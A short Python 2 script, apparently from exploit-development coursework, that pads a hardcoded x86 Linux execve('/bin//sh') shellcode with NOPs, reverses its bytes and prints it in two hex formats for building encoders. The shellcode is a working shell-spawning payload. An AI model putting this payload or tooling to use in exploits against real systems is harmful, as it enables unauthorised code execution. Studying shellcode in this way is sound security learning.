#!/usr/bin/python

import sys	

encoded1= ""
encoded2= ""

#define shellcode
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

#check if shellcode length can be split into groups of 4, otherwise pad it with nops
if (len(shellcode) % 4)!= 0:
   shellcode += ("\x90" * (4- len(shellcode) % 4))

#reverse array and format it for printing
for i in bytearray(shellcode[::-1]): 
 x = i 
 encoded1 += '\\x'  
 encoded1 += '%02x' %x  
  
 encoded2 += '0x'  
 encoded2 += '%02x,' %x  
  
print "Format 1: {0}".format(encoded1) 

#print second format without final comma	 
print "Format 2: {0}".format(encoded2[:-1])  
